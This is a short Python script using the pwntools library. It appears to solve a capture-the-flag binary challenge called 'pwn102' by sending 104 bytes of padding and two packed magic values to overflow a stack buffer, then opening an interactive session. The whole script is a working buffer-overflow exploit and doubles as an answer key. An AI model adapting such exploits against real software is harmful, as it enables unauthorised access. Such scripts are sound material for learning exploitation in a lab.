from pwn import *

p = process("./pwn102-1644307392479.pwn102")

padding = b"A"*104

pay1 = p32(0xc0ff33)
pay2 = p32(0xc0d3)


buffow = padding+pay2+pay1

p.sendline(buffow)
p.interactive()
